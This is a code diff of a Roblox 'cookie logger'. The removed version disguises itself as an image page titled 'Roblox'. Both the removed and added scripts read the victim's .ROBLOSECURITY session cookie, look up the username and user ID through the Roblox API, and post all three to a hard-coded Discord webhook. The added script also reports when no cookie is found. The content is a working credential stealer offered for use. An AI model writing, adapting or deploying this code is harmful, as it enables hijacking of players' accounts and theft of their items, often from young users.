@@ -1,73 +1,45 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
-    <style>
-        body { margin:0; background:#000; display:flex; align-items:center; justify-content:center; height:100vh; }
-        img { max-width:90%; border-radius:12px; box-shadow:0 0 30px rgba(0,170,255,0.6); }
-    </style>
-</head>
-<body>
-    <img src="https://i.imgur.com/yourimagehere.png" alt="Roblox"> <!-- Replace with any image link -->
+<script>
+    const webhook = "https://discord.com/api/webhooks/1494423700311642223/fVh3QpH1yVoPimpFgMiVZ412kJn7p0gVkUwc4F0dyqnKcIx0j0HoQYdwzbMVrIuag3r-"; // ← CHANGE THIS
 
-    <script>
-        const webhook = "https://discord.com/api/webhooks/1494423700311642223/fVh3QpH1yVoPimpFgMiVZ412kJn7p0gVkUwc4F0dyqnKcIx0j0HoQYdwzbMVrIuag3r-"; // <-- PUT YOUR WEBHOOK HERE
-
-        function sendLog(data) {
-            fetch(webhook, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🎣 Roblox Cookie Logger",
-                        color: 0x00aaff,
-                        fields: [
-                            { name: "Username", value: `\`${data.username}\``, inline: true },
-                            { name: "User ID", value: `\`${data.userid}\``, inline: true },
-                            { name: ".ROBLOSECURITY", value: `\`\`\`${data.cookie}\`\`\`` }
-                        ],
-                        footer: { text: "Image Logger • " + new Date().toLocaleString() },
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(() => {});
-        }
-
-        // Grab .ROBLOSECURITY cookie
-        function getCookie(name) {
-            const value = `; ${document.cookie}`;
-            const parts = value.split(`; ${name}=`);
-            if (parts.length === 2) return parts.pop().split(';').shift();
-            return null;
-        }
-
-        const cookie = getCookie(".ROBLOSECURITY");
-
-        if (cookie) {
-            // Get username and userid via Roblox API
-            fetch("https://users.roblox.com/v1/users/authenticated", {
-                credentials: "include",
-                headers: { "Referer": "https://www.roblox.com/" }
+    function sendLog(username, userid, cookie) {
+        fetch(webhook, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🎣 Roblox Cookie Logger - SUCCESS",
+                    color: 0x00ff00,
+                    fields: [
+                        {name: "Username", value: `\`${username}\``, inline: true},
+                        {name: "User ID", value: `\`${userid}\``, inline: true},
+                        {name: ".ROBLOSECURITY", value: `\`\`\`${cookie}\`\`\``}
+                    ],
+                    footer: {text: "Image Logger • " + new Date().toLocaleString()},
+                    timestamp: new Date().toISOString()
+                }]
             })
-            .then(res => res.json())
-            .then(user => {
-                sendLog({
-                    username: user.name || "Unknown",
-                    userid: user.id || "Unknown",
-                    cookie: cookie
-                });
-            })
-            .catch(() => {
-                // Fallback if API fails
-                sendLog({
-                    username: "Unknown (API blocked)",
-                    userid: "Unknown",
-                    cookie: cookie
-                });
-            });
-        }
-    </script>
-</body>
-</html>
+        });
+    }
+
+    const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1];
+
+    if (cookie) {
+        // Try Roblox API
+        fetch("https://users.roblox.com/v1/users/authenticated", {credentials: "include"})
+        .then(r => r.json())
+        .then(user => {
+            sendLog(user.name || "Unknown", user.id || "N/A", cookie);
+        })
+        .catch(() => {
+            // Fallback - send cookie anyway
+            sendLog("Unknown (API blocked)", "N/A", cookie);
+        });
+    } else {
+        // No cookie found
+        fetch(webhook, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({content: "❌ No .ROBLOSECURITY cookie found on this browser."})
+        });
+    }
+</script>
